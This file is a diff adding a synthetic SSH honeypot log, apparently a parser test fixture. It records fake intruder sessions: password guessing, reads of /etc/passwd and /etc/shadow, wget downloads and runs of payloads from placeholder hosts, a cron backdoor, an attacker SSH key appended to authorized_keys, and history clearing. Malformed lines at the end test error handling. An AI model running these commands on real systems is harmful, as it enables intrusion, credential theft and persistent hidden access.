@@ -1,0 +1,80 @@
+2024-01-15 10:30:15+0000 [SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] login attempt [root/password] succeeded
+2024-01-15 10:30:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: whoami
+2024-01-15 10:30:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: ls -la
+2024-01-15 10:30:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: pwd
+2024-01-15 10:30:35+0000 [SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] connection lost
+2024-01-15 11:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [admin/admin] failed
+2024-01-15 11:00:05+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [admin/123456] succeeded
+2024-01-15 11:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: uname -a
+2024-01-15 11:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: cat /etc/passwd
+2024-01-15 11:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: wget http://malicious.com/payload.sh
+2024-01-15 11:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: chmod +x payload.sh
+2024-01-15 11:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: ./payload.sh
+2024-01-15 11:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: rm payload.sh
+2024-01-15 11:00:40+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] connection lost
+2024-01-15 12:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,10,192.168.1.102] login attempt [root/password] failed
+2024-01-15 12:00:05+0000 [SSHService ssh-connection on HoneyPotTransport,11,192.168.1.102] login attempt [root/123456] failed
+2024-01-15 12:00:10+0000 [SSHService ssh-connection on HoneyPotTransport,12,192.168.1.102] login attempt [root/admin] failed
+2024-01-15 12:00:15+0000 [SSHService ssh-connection on HoneyPotTransport,13,192.168.1.102] login attempt [root/root] failed
+2024-01-15 12:00:20+0000 [SSHService ssh-connection on HoneyPotTransport,14,192.168.1.102] login attempt [root/qwerty] failed
+2024-01-15 12:00:25+0000 [SSHService ssh-connection on HoneyPotTransport,15,192.168.1.102] login attempt [root/letmein] failed
+2024-01-15 12:00:30+0000 [SSHService ssh-connection on HoneyPotTransport,16,192.168.1.102] login attempt [root/welcome] failed
+2024-01-15 12:00:35+0000 [SSHService ssh-connection on HoneyPotTransport,17,192.168.1.102] login attempt [root/monkey] failed
+2024-01-15 12:00:40+0000 [SSHService ssh-connection on HoneyPotTransport,18,192.168.1.102] login attempt [root/toor] succeeded
+2024-01-15 13:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] login attempt [user/user] succeeded
+2024-01-15 13:00:05+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: uname -a
+2024-01-15 13:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: cat /proc/version
+2024-01-15 13:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: ps aux
+2024-01-15 13:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: netstat -an
+2024-01-15 13:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: cat /etc/passwd
+2024-01-15 13:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: cat /etc/shadow
+2024-01-15 13:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: find / -name '*.conf' 2>/dev/null
+2024-01-15 13:00:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: ls -la /home
+2024-01-15 13:00:45+0000 [SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] connection lost
+2024-01-15 14:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] login attempt [test/test] succeeded
+2024-01-15 14:00:05+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: cd /tmp
+2024-01-15 14:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: wget http://example.com/script.sh
+2024-01-15 14:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: curl -O http://example.com/data.txt
+2024-01-15 14:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: chmod 755 script.sh
+2024-01-15 14:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: ./script.sh
+2024-01-15 14:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: cat data.txt
+2024-01-15 14:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: rm script.sh data.txt
+2024-01-15 14:00:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: history -c
+2024-01-15 14:00:45+0000 [SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] connection lost
+2024-01-15 15:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] login attempt [backup/backup] succeeded
+2024-01-15 15:00:05+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: whoami
+2024-01-15 15:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: crontab -l
+2024-01-15 15:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: echo '*/5 * * * * /tmp/.hidden/backdoor.sh' | crontab -
+2024-01-15 15:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: mkdir -p /tmp/.hidden
+2024-01-15 15:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: wget -O /tmp/.hidden/backdoor.sh http://malicious.com/backdoor.sh
+2024-01-15 15:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: chmod +x /tmp/.hidden/backdoor.sh
+2024-01-15 15:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com' >> ~/.ssh/authorized_keys
+2024-01-15 15:00:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: service ssh restart
+2024-01-15 15:00:45+0000 [SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] connection lost
+2024-01-15 16:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,50,192.168.1.110] login attempt [root/password] succeeded
+2024-01-15 16:00:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,50,192.168.1.110] CMD: whoami
+2024-01-15 16:00:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,50,192.168.1.110] CMD: uname -a
+2024-01-15 16:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,50,192.168.1.110] connection lost
+2024-01-15 16:02:00+0000 [SSHService ssh-connection on HoneyPotTransport,51,192.168.1.111] login attempt [root/password] succeeded
+2024-01-15 16:02:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,51,192.168.1.111] CMD: whoami
+2024-01-15 16:02:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,51,192.168.1.111] CMD: uname -a
+2024-01-15 16:02:00+0000 [SSHService ssh-connection on HoneyPotTransport,51,192.168.1.111] connection lost
+2024-01-15 16:04:00+0000 [SSHService ssh-connection on HoneyPotTransport,52,192.168.1.112] login attempt [root/password] succeeded
+2024-01-15 16:04:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,52,192.168.1.112] CMD: whoami
+2024-01-15 16:04:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,52,192.168.1.112] CMD: uname -a
+2024-01-15 16:04:00+0000 [SSHService ssh-connection on HoneyPotTransport,52,192.168.1.112] connection lost
+2024-01-15 16:06:00+0000 [SSHService ssh-connection on HoneyPotTransport,53,10.0.0.50] login attempt [root/password] succeeded
+2024-01-15 16:06:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,53,10.0.0.50] CMD: whoami
+2024-01-15 16:06:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,53,10.0.0.50] CMD: uname -a
+2024-01-15 16:06:00+0000 [SSHService ssh-connection on HoneyPotTransport,53,10.0.0.50] connection lost
+2024-01-15 16:08:00+0000 [SSHService ssh-connection on HoneyPotTransport,54,172.16.0.100] login attempt [root/password] succeeded
+2024-01-15 16:08:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,54,172.16.0.100] CMD: whoami
+2024-01-15 16:08:00+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,54,172.16.0.100] CMD: uname -a
+2024-01-15 16:08:00+0000 [SSHService ssh-connection on HoneyPotTransport,54,172.16.0.100] connection lost
+Invalid log entry without proper format
+2024-01-15 [Incomplete timestamp entry
+2024-01-15 17:00:00+0000 [Missing transport info] CMD: test
+
+2024-01-15 17:00:05+0000 [SSHService ssh-connection on HoneyPotTransport,60,192.168.1.120] login attempt [user/pass] succeeded
+Completely malformed entry with no structure at all
+2024-01-15 17:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,60,192.168.1.120] CMD: ls
